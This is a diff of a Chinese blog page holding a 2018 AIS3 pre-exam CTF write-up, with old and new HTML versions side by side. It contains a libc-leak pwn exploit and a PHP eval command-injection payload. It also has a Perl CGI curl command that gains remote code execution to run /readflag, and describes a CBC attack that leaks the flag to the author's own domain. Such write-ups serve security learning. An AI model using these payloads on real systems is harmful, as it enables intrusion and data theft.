class="number">-1</span>].split(<span class="string">"x"</span>)</span><br><span class="line">        <span class="keyword">print</span> libc</span><br><span class="line">        libc = int(libc[len(libc)<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"libc_start_main: "</span> +hex(libc)</span><br><span class="line">        libc =  libc - <span class="number">0x21f45</span></span><br><span class="line">        magic = libc+magic</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"libc_base: "</span> +hex(libc)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"magic: "</span> + hex(magic)</span><br><span class="line"></span><br><span class="line">        spell_rbp = p64(magic).ljust(<span class="number">16</span>,<span class="string">"\0"</span>) + <span class="string">"h"</span></span><br><span class="line">        <span class="keyword">print</span> spell_rbp</span><br><span class="line">        r.recvuntil(<span class="string">"Give me your spell: "</span>)</span><br><span class="line">        r.send(spell_rbp)</span><br><span class="line">        r.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"try again"</span></span><br></pre></td></tr></table></figure>
 <p><strong>AIS3{m1gRatlon_&amp;_b0f_13_Qu1t3_3asY!!!}</strong></p>
 <hr>
 <h1 id="Crypto-1-POW"><a href="#Crypto-1-POW" class="headerlink" title="Crypto-1:POW"></a>Crypto-1:POW</h1><p>總之讓你算 proof of work，為後面的題目做準備，然後我在聊天室有看到有人說 pool 對就會算得快，基本上這概念是錯的<br>這裡的 proof of work 其實就是 hashcash 也就是 blockchain 裡面那個鬼東西，如果有個特定的 pool 算比較快……，可以讓我投資嗎？<br>總之這邊就是 +1 +1 這樣慢慢算，不要用隨機的，程式裡的隨機是 pseudo random ，會一直撞到剛剛算過的值</p>
 <p><strong>AIS3{Spid3r mAn - H3L1O wOR1d PrO0F 0F WOrK}</strong></p>
 <hr>
-<h1 id="Crypto-2-XOR"><a href="#Crypto-2-XOR" class="headerlink" title="Crypto-2:XOR"></a>Crypto-2:XOR</h1><p>他把明文跟 key 串接在一起，然後用 key 對這個新的字串做 xor 加密，<code>encrypt.py</code>中看得出來 key 的長度在 8~12，這種加密會造成的問題是，可以用最後 8~12 個字元，來推算出 key 的長度<br>從 flag 形式可以知道明文開頭是 <code>AIS3{</code> ，用密文做 xor 得到 key 的前五個 byte，測試一下會發現 key 長度是 10 ，然後把 key 剩下的部分炸開就好了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">key = key[:<span class="number">5</span>]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</div><div class="line">    <span class="keyword">for</span> trial <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</div><div class="line">        <span class="keyword">if</span> chr(trial^ord(cipher[<span class="number">-6</span>+i])) == key[<span class="number">-1</span>]:</div><div class="line">            key += chr(trial)</div><div class="line">            <span class="keyword">print</span> trial</div><div class="line">            <span class="keyword">break</span></div><div class="line">flag = <span class="string">''</span>.join(map(chr,[ ord(cipher[i])^ord(key[i%len(key)]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)) ])</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
+<h1 id="Crypto-2-XOR"><a href="#Crypto-2-XOR" class="headerlink" title="Crypto-2:XOR"></a>Crypto-2:XOR</h1><p>他把明文跟 key 串接在一起，然後用 key 對這個新的字串做 xor 加密，<code>encrypt.py</code>中看得出來 key 的長度在 8<del>12，這種加密會造成的問題是，可以用最後 8</del>12 個字元，來推算出 key 的長度<br>從 flag 形式可以知道明文開頭是 <code>AIS3{</code> ，用密文做 xor 得到 key 的前五個 byte，測試一下會發現 key 長度是 10 ，然後把 key 剩下的部分炸開就好了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = key[:<span class="number">5</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> trial <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> chr(trial^ord(cipher[<span class="number">-6</span>+i])) == key[<span class="number">-1</span>]:</span><br><span class="line">            key += chr(trial)</span><br><span class="line">            <span class="keyword">print</span> trial</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">flag = <span class="string">''</span>.join(map(chr,[ ord(cipher[i])^ord(key[i%len(key)]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)) ])</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
 <p><strong>AIS3{captAIn aMeric4 - Wh4T3V3R HapPenS t0mORr0w YOU mUst PR0Mis3 ME on3 tHIng. TH4T yOu WiLL stAY Who Y0U 4RE. Not A pERfect sO1dIER, buT 4 gOOD MAn.}</strong></p>
 <hr>
-<h1 id="Crypto-3-IOU"><a href="#Crypto-3-IOU" class="headerlink" title="Crypto-3:IOU"></a>Crypto-3:IOU</h1><p>這題用 RSA 來 sign 一個借據，sign 跟 encrypt 的差別在於：sign 用私鑰加密即$m^{d} \equiv c\;mod\;N$，encrypt 用公鑰加密即$m^{e} \equiv c\;mod\;N$，所以這裡的 sign 其實沒用什麼特別的算法，官方也不推薦直接使用 sign ，應該要用 PKCS 之類的東西來簽才對</p>
+<h1 id="Crypto-3-IOU"><a href="#Crypto-3-IOU" class="headerlink" title="Crypto-3:IOU"></a>Crypto-3:IOU</h1><p>這題用 RSA 來 sign 一個借據，sign 跟 encrypt 的差別在於：sign 用私鑰加密即$m^{d} \equiv c;mod;N$，encrypt 用公鑰加密即$m^{e} \equiv c;mod;N$，所以這裡的 sign 其實沒用什麼特別的算法，官方也不推薦直接使用 sign ，應該要用 PKCS 之類的東西來簽才對</p>
 <p>這題的問題在於，他沒有驗證全部的訊息，他直接 split 找第四個元素，看他是不是 10，因此我們只要造假一個第四個元素 &gt; 10 的明文就好了，要造假簽章我們要通過<code>key.verify</code>，但是因為我們有公鑰 (N, e)，我們可以逆過來玩，只要隨便亂弄一個密文<code>s</code>，就可以得到一個亂七八糟的明文 m = ($s^e$ mod N)，這東西一定會通過<code>key.verify</code>，然後有沒有通過 &gt; 10 就是靠運氣，所以一直撞到過就會有 flag 了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">fake_s = <span class="string">""</span></div><div class="line">c = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        cc = int(<span class="string">''</span>.join(c))</div><div class="line">        m = pow(cc, e, n)</div><div class="line">        test = long_to_bytes(m)</div><div class="line">        bucks = int(test.split()[<span class="number">3</span>])</div><div class="line">        <span class="keyword">print</span> bucks,</div><div class="line">        <span class="keyword">if</span> bucks &gt; <span class="number">10</span>:</div><div class="line">            fake_s = str(cc)</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">except</span> EOFError:</div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    c += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> str(m)</div><div class="line"><span class="keyword">print</span> fake_s </div><div class="line"><span class="keyword">print</span> <span class="string">"find"</span></div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_s = <span class="string">""</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cc = int(<span class="string">''</span>.join(c))</span><br><span class="line">        m = pow(cc, e, n)</span><br><span class="line">        test = long_to_bytes(m)</span><br><span class="line">        bucks = int(test.split()[<span class="number">3</span>])</span><br><span class="line">        <span class="keyword">print</span> bucks,</span><br><span class="line">        <span class="keyword">if</span> bucks &gt; <span class="number">10</span>:</span><br><span class="line">            fake_s = str(cc)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    c += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> str(m)</span><br><span class="line"><span class="keyword">print</span> fake_s </span><br><span class="line"><span class="keyword">print</span> <span class="string">"find"</span></span><br></pre></td></tr></table></figure>
+
 <p><strong>AIS3{D0cT0R StRaNG3 - F0rgERy ATTaCk Ag4InsT RSa DIgital SigNatUrE}</strong></p>
 <hr>
 <h1 id="Crypto-4-EFAIL"><a href="#Crypto-4-EFAIL" class="headerlink" title="Crypto-4:EFAIL"></a>Crypto-4:EFAIL</h1><p>這題腳本寫到一半，總之利用 CBC 的弱點，在知道明文的情況下，我們可以替換密文來修改明文，例如我們有 $C_0, P_1, Fake$，我們把本來$C_0$的地方替換成$C_0 \oplus P_1 \oplus Fake$，這樣$C_1$解密完後會 xor 到錯誤的值，讓本來的 $C_0\oplus P_1$無法還原成$P_1$而變成$Fake$，然後他有提供<code>web</code>這個上網的指令，把flag前面改成<code>web &#39;mydoman.tw</code>，我們就可以去自己的 domain 撈到 flag，注意到後面過幾行有句英文有<code>&#39;</code>，他會把這整段都當網址訪問，所以不用自己再加一個<code>&#39;</code>來閉合</p>
 <hr>
-<h1 id="Web-1-warmup"><a href="#Web-1-warmup" class="headerlink" title="Web-1:warmup"></a>Web-1:warmup</h1><p>連到 <a href="http://104.199.235.135:31331/index.php\?p=7" target="_blank" rel="external">http://104.199.235.135:31331/index.php\?p=7</a> 發現 header 裡面有一欄 <code>Partial-Flag:d</code>，推測 URL 裡面的 p 表示是 flag 中的第 p 個字元，所以變動 index 拼出 flag</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..50&#125;</div><div class="line"><span class="keyword">do</span> </div><div class="line">    curl -v http://104.199.235.135:31331/index.php\?p\=<span class="variable">$i</span> 2&gt;&amp;1 | grep Flag | awk <span class="string">'&#123;printf $3&#125;'</span> | tr -d <span class="string">'\r'</span> &gt;&gt; flag.txt </div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
+<h1 id="Web-1-warmup"><a href="#Web-1-warmup" class="headerlink" title="Web-1:warmup"></a>Web-1:warmup</h1><p>連到 <a href="http://104.199.235.135:31331/index.php\?p=7" target="_blank" rel="noopener">http://104.199.235.135:31331/index.php\?p=7</a> 發現 header 裡面有一欄 <code>Partial-Flag:d</code>，推測 URL 裡面的 p 表示是 flag 中的第 p 個字元，所以變動 index 拼出 flag</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..50&#125;</span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">    curl -v http://104.199.235.135:31331/index.php\?p\=<span class="variable">$i</span> 2&gt;&amp;1 | grep Flag | awk <span class="string">'&#123;printf $3&#125;'</span> | tr -d <span class="string">'\r'</span> &gt;&gt; flag.txt </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 <p><strong>AIS3{g00d! u know how 2 check H3AD3R fie1ds.}</strong></p>
 <hr>
 <h1 id="Web-2-hidden"><a href="#Web-2-hidden" class="headerlink" title="Web-2:hidden"></a>Web-2:hidden</h1><p>先到 <code>robots.txt</code> 會找到一個連結叫做 <code>_hidden_flag_.php</code><br>他會倒數個 1x 秒然後跳出一個按鈕到下一頁<br>他其實送出了一個有兩個隱藏欄位 <code>c</code>，<code>s</code> 的表單，用來取得下次的 <code>c</code>，<code>s</code>值，直到某個關鍵點就會給 flag 了<br>寫個腳本讓他飛一會兒，要跑 17xxx 次才結束</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">r = requests.get(<span class="string">"http://104.199.235.135:31332/_hidden_flag_.php"</span>)</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="string">"no flag here"</span> <span class="keyword">in</span> r.text:</div><div class="line">    m = re.findall(<span class="string">'value="([A-Za-z0-9]*)"'</span>,r.text)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</div><div class="line">        <span class="keyword">print</span> i</div><div class="line">    r = requests.post(<span class="string">'http://104.199.235.135:31332/_hidden_flag_.php'</span>, data = &#123;<span class="string">'c'</span>:m[<span class="number">0</span>],<span class="string">'s'</span>:m[<span class="number">1</span>]&#125;)</div><div class="line">    <span class="keyword">print</span> r.text</div><div class="line"></div><div class="line"><span class="keyword">print</span>  r.headers</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">"http://104.199.235.135:31332/_hidden_flag_.php"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="string">"no flag here"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    m = re.findall(<span class="string">'value="([A-Za-z0-9]*)"'</span>,r.text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">    r = requests.post(<span class="string">'http://104.199.235.135:31332/_hidden_flag_.php'</span>, data = &#123;<span class="string">'c'</span>:m[<span class="number">0</span>],<span class="string">'s'</span>:m[<span class="number">1</span>]&#125;)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>  r.headers</span><br></pre></td></tr></table></figure>
+
 <p><strong>AIS3{g00d_u_know_how_2_script_4_W3B_3e02c41e2d6243765575b12442bc8480}</strong></p>
-<h1 id="Web-3-sushi"><a href="#Web-3-sushi" class="headerlink" title="Web-3:sushi"></a>Web-3:sushi</h1><p>題目是 <code>php</code>，關鍵的一行是他用<code>eval</code>包住了<code>die</code>，這裡我們可以用 php 神秘的特性，參考 Orange 的 <a href="http://blog.orange.tw/2012/11/phpconf-2012-security-in-php.html" target="_blank" rel="external">blog</a><br>其中<code>@</code>是用來抑制錯誤訊息，然後有限制字串長度不能超過 16 ，而且不可以包含 <code>&#39;</code>，<code>&quot;</code><br>先看目錄下有什麼檔案</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://104.199.235.135:31333/?%F0%9F%8D%A3=$&#123;@print(`ls`)&#125;</div></pre></td></tr></table></figure>
-<p>目錄下有 <code>phpinfo.php</code>，<code>index.php</code>，<code>flag_name_1s_t00_l0ng_QAQQQQQQ</code>，這邊用低端解法，直接存取XDDD<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://104.199.235.135:31333/flag_name_1s_t00_l0ng_QAQQQQQQ</div></pre></td></tr></table></figure></p>
+<h1 id="Web-3-sushi"><a href="#Web-3-sushi" class="headerlink" title="Web-3:sushi"></a>Web-3:sushi</h1><p>題目是 <code>php</code>，關鍵的一行是他用<code>eval</code>包住了<code>die</code>，這裡我們可以用 php 神秘的特性，參考 Orange 的 <a href="http://blog.orange.tw/2012/11/phpconf-2012-security-in-php.html" target="_blank" rel="noopener">blog</a><br>其中<code>@</code>是用來抑制錯誤訊息，然後有限制字串長度不能超過 16 ，而且不可以包含 <code>&#39;</code>，<code>&quot;</code><br>先看目錄下有什麼檔案</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;104.199.235.135:31333&#x2F;?%F0%9F%8D%A3&#x3D;$&#123;@print(&#96;ls&#96;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>目錄下有 <code>phpinfo.php</code>，<code>index.php</code>，<code>flag_name_1s_t00_l0ng_QAQQQQQQ</code>，這邊用低端解法，直接存取XDDD</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;104.199.235.135:31333&#x2F;flag_name_1s_t00_l0ng_QAQQQQQQ</span><br></pre></td></tr></table></figure>
 <p>不過如果不幸的不能直接存取，其實可以用截斷的方式來讓 php 誤判我們放進去 GET 的字串長度，來進行任意長度的 command injection</p>
 <p><strong>AIS3{php_is_very_very_very_easyyyyyy}</strong></p>
 <h1 id="Web-4-perljam"><a href="#Web-4-perljam" class="headerlink" title="Web-4:perljam"></a>Web-4:perljam</h1><p>這題看起來空空如也，不過有 git leak 的問題，總之抓下來會找到一段關鍵的 upload 程式碼</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">use</span> strict;</div><div class="line"><span class="keyword">use</span> warnings;</div><div class="line"><span class="keyword">use</span> CGI;</div><div class="line"><span class="keyword">my</span> $cgi = CGI-&gt;new;</div><div class="line"><span class="keyword">print</span> $cgi-&gt;header();</div><div class="line"><span class="keyword">print</span> <span class="string">"&lt;body style=\"background: #caccf7 url('https://i.imgur.com/Syv2IVk.png');padding: 30px;\"&gt;"</span>;</div><div class="line"><span class="keyword">print</span> <span class="string">"&lt;p style='color:red'&gt;No BUG Q_____Q&lt;/p&gt;"</span>;</div><div class="line"><span class="keyword">print</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">print</span> <span class="string">"&lt;pre&gt;"</span>;</div><div class="line"><span class="keyword">if</span>( $cgi-&gt;upload(<span class="string">'file'</span>) ) &#123;</div><div class="line">        <span class="keyword">my</span> $file = $cgi-&gt;param(<span class="string">'file'</span>);</div><div class="line">        <span class="keyword">while</span>(&lt;$file&gt;) &#123;</div><div class="line">                <span class="keyword">print</span> <span class="string">"$_"</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">print</span> <span class="string">"&lt;/pre&gt;"</span>;</div></pre></td></tr></table></figure>
-<p>可以參考 black hat 的一個<a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf" target="_blank" rel="external">簡報</a>，我們可以造假一個 file 來做到 RCE<br>本題不能直接<code>cat flag</code>，權限不夠，在根目錄下面有支可以讀取 flag 的程式，我們要執行他來取得 flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo &quot;trash&quot; | curl -F &quot;file=ARGV&quot; -F &quot;file=@-&quot; &quot;http://104.199.235.135:31334/cgi-bin/index.cgi?/readflag|&quot;</div></pre></td></tr></table></figure></p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">my</span> $cgi = CGI-&gt;new;</span><br><span class="line"><span class="keyword">print</span> $cgi-&gt;header();</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;body style=\"background: #caccf7 url('https://i.imgur.com/Syv2IVk.png');padding: 30px;\"&gt;"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;p style='color:red'&gt;No BUG Q_____Q&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>( $cgi-&gt;upload(<span class="string">'file'</span>) ) &#123;</span><br><span class="line">        <span class="keyword">my</span> $file = $cgi-&gt;param(<span class="string">'file'</span>);</span><br><span class="line">        <span class="keyword">while</span>(&lt;$file&gt;) &#123;</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"$_"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br></pre></td></tr></table></figure>
+<p>可以參考 black hat 的一個<a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf" target="_blank" rel="noopener">簡報</a>，我們可以造假一個 file 來做到 RCE<br>本題不能直接<code>cat flag</code>，權限不夠，在根目錄下面有支可以讀取 flag 的程式，我們要執行他來取得 flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;trash&quot; | curl -F &quot;file&#x3D;ARGV&quot; -F &quot;file&#x3D;@-&quot; &quot;http:&#x2F;&#x2F;104.199.235.135:31334&#x2F;cgi-bin&#x2F;index.cgi?&#x2F;readflag|&quot;</span><br></pre></td></tr></table></figure>
+
 <p><strong>AIS3{here_is_your_flag}</strong></p>
 <hr>
 <h1 id="Misc-1-welcome"><a href="#Misc-1-welcome" class="headerlink" title="Misc-1:welcome"></a>Misc-1:welcome</h1><p>看教學影片，裡面有 flag</p>
@@ -468,7 +487,7 @@ height:50vh;
 <h1 id="Misc-2-flag"><a href="#Misc-2-flag" class="headerlink" title="Misc-2:flag"></a>Misc-2:flag</h1><p>三隻假 flag，圖片上的，strings 出來的， pkcrack 出來的都是假的。<br>本來就覺得他給的圖上的點點看起來很不整齊，猜測是摩斯電碼，吃完晚餐回來一下就過了，不過圖片是 jpeg 壓縮的關係有點模糊，總之對著翻譯出來就是 flag</p>
 <p><strong>AIS3{YOUFINDTHEREALFLAGOHYEAH}</strong></p>
 <hr>
-<h1 id="Misc-3-svega"><a href="#Misc-3-svega" class="headerlink" title="Misc-3:svega"></a>Misc-3:svega</h1><p>mp3 音訊隱寫，用 <a href="http://www.petitcolas.net/steganography/mp3stego/" target="_blank" rel="external">MP3stego</a> 加密的，沒有設定 password ，decode 下去就是 flag</p>
+<h1 id="Misc-3-svega"><a href="#Misc-3-svega" class="headerlink" title="Misc-3:svega"></a>Misc-3:svega</h1><p>mp3 音訊隱寫，用 <a href="http://www.petitcolas.net/steganography/mp3stego/" target="_blank" rel="noopener">MP3stego</a> 加密的，沒有設定 password ，decode 下去就是 flag</p>
 <p><strong>AIS3{I_HearD_imPlIeD_Fl46_1N_TH3_5oN6}</strong></p>
 <hr>
 <h1 id="Misc-4-blind"><a href="#Misc-4-blind" class="headerlink" title="Misc-4:blind"></a>Misc-4:blind</h1><p>這題還沒來得及想，聽 Maojui 講了個大概，是有趣的一題。</p>
@@ -480,7 +499,7 @@ height:50vh;
             <p>Original Author: <a href="http://blog.terrynini.tw">Terrynini</a>
             <p>Original link: <a href="http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/">http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/</a>
             <p>Publish at: <a href="http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/">June 13th 2018, 11:20:22</a>
-            <p>Copyright: This article is licensed under <a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></p>
+            <p>Copyright: This article is licensed under <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></p>
         </div>
     
     <!-- paginator  -->
@@ -526,7 +545,7 @@ height:50vh;
         })();
 
     </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
 
     
     <!-- partial('_partial/comment/changyan') -->
@@ -542,6 +561,11 @@ height:50vh;
             
         </div>
         <footer class="footer footer-unloaded">
+    <!-- mermaid-->
+    
+      <script src="https://unpkg.com/mermaid@8.4.6/dist/mermaid.min.js"></script>
+      <script>mermaid.initialize({startOnLoad:true});</script>
+      
     <!-- social  -->
     
     <div class="social">
@@ -1037,12 +1061,9 @@ top:50vh;
     
     
     
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 30
+        Total : 31
         </div>
         <!-- search  -->
         
@@ -1072,12 +1093,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/tw/程式安全-HW4-Write-up/" >程式安全::HW4 Write-up</a>
+            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/tw/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW4-Write-up/" >程式安全::HW4 Write-up</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/21</span><a class="archive-post-title" href= "/tw/程式安全-HW3-Write-up/" >程式安全::HW3 Write-up</a>
+            <span class="archive-post-date">11/21</span><a class="archive-post-title" href= "/tw/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW3-Write-up/" >程式安全::HW3 Write-up</a>
         </li>
     
     
@@ -1087,7 +1108,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/tw/2019-AIS3-前測官方解/" >2019::AIS3::前測官方解</a>
+            <span class="archive-post-date">06/29</span><a class="archive-post-title" href= "/tw/2020-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/" >2020::AIS3::前測官方解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/tw/2019-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/" >2019::AIS3::前測官方解</a>
         </li>
     
     
@@ -1097,7 +1123,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/tw/TIL-攻擊LCG-線性同餘生成器/" >TIL::攻擊LCG(線性同餘生成器)</a>
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/tw/TIL-%E6%94%BB%E6%93%8ALCG-%E7%B7%9A%E6%80%A7%E5%90%8C%E9%A4%98%E7%94%9F%E6%88%90%E5%99%A8/" >TIL::攻擊LCG(線性同餘生成器)</a>
         </li>
     
     
@@ -1107,7 +1133,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/17</span><a class="archive-post-title" href= "/tw/TIL-利用-Chakra-JIT-繞過-DEP-和-CFG/" >TIL::利用 Chakra JIT 繞過 DEP 和 CFG</a>
+            <span class="archive-post-date">03/17</span><a class="archive-post-title" href= "/tw/TIL-%E5%88%A9%E7%94%A8-Chakra-JIT-%E7%B9%9E%E9%81%8E-DEP-%E5%92%8C-CFG/" >TIL::利用 Chakra JIT 繞過 DEP 和 CFG</a>
         </li>
     
     
@@ -1166,17 +1192,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/tw/Advance-Algorithm-homework6/" >Advance-Algorithm::homework6</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/tw/Advance-Algorithm-homework5/" >Advance-Algorithm::homework5</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/tw/Advance-Algorithm-homework7/" >Advance-Algorithm::homework7</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span><a class="archive-post-title" href= "/tw/Advance-Algorithm-homework6/" >Advance-Algorithm::homework6</a>
         </li>
     
     
@@ -1215,12 +1241,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/en/2017-HITCON-Quals-Sakura-English/" >2017::HITCON-Quals::Sakura::English</a>
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/tw/2017-HITCON-qual-Sakura/" >2017::HITCON-qual::Sakura</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/tw/2017-HITCON-qual-Sakura/" >2017::HITCON-qual::Sakura</a>
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/en/2017-HITCON-Quals-Sakura-English/" >2017::HITCON-Quals::Sakura::English</a>
         </li>
     
     
@@ -1244,31 +1270,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="HITCON"><span class="iconfont-archer">&#xe606;</span>HITCON</span>
     
